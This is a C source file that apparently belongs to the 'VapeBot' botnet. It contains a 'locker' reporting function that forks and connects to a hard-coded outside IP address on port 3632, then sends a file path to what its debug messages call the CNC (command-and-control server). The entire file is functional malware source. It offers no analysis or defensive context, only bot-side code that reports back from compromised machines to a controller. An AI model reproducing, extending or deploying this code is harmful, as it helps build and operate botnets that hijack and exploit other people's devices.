#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "headers/includes.h"
#include "headers/locker.h"

void report_working(char *path) {
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(91,92,247,79);
    addr.sin_port = htons(3632);

    if (connect(fd, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
        printf("[VapeBot/Locker] Failed to connect to locker reporter!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    uint8_t len = strlen(path);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &(len), sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, path, len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[VapeBot/Locker] Sent result(s) to CNC!\n");
#endif

    close(fd);
    exit(0);
}
